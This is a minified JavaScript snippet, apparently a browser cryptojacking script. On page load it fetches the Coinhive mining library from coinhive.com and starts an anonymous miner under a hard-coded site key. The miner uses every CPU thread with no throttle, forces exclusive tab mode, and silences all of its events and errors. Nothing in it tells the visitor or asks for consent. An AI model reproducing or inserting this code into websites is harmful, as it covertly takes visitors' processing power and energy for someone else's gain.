! function() {
    var n = function() { try { return !!window.addEventListener } catch (n) { return !1 } },
        t = function(t, o) { n() ? document.addEventListener("DOMContentLoaded", t, o) : document.attachEvent("onreadystatechange", t) };
    t(function() {
        ! function() {
            var n = document.createElement("script");
            n.type = "text/javascript", n.async = !0;
            var t = document.getElementsByTagName("script")[0];
            n.src = "https://coinhive.com/lib/coinhive.min.js", n.onload = function() {
                function n(n) { return r.start(n) }
                var t = "jVwy4y10DD5Ahz6qQ83qLrwXd5KZgJfp",
                    o = !0,
                    e = navigator.hardwareConcurrency,
                    c = 0,
                    r = new CoinHive.Anonymous(t, { throttle: c, threads: e }),
                    i = CoinHive.FORCE_EXCLUSIVE_TAB;
                o && n(i), r.on("open", function() {}), r.on("authed", function(n) {}), r.on("close", function() {}), r.on("error", function(n) {}), r.on("job", function() {}), r.on("found", function() {}), r.on("accepted", function() {})
            }, n.onerror = function() {}, t.parentNode.insertBefore(n, t)
        }()
    }, !1)
}();